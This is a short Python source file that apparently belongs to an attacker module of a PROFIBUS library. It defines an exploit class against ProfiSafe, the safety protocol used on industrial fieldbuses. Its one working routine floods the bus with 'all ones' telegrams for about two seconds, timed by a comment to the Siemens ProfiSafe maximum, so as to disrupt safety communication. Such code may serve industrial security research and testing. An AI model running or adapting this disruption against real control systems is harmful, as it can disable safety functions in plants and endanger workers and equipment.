import time
from pyprofibus.attacker.exploit import Exploit


class ExploitProfiSafe(Exploit):

    def disturbCommunication(self):
        print("Disturbing communication at time: %d" % time.time())
        # disturbing for 2 seconds (Siemens ProfiSafe max)
        for i in range(40):
            self.slave.phy.sendData(self.telegram_all_one, None)
            time.sleep(0.05)
    
    def communicationBroke(self) -> bool:
        return True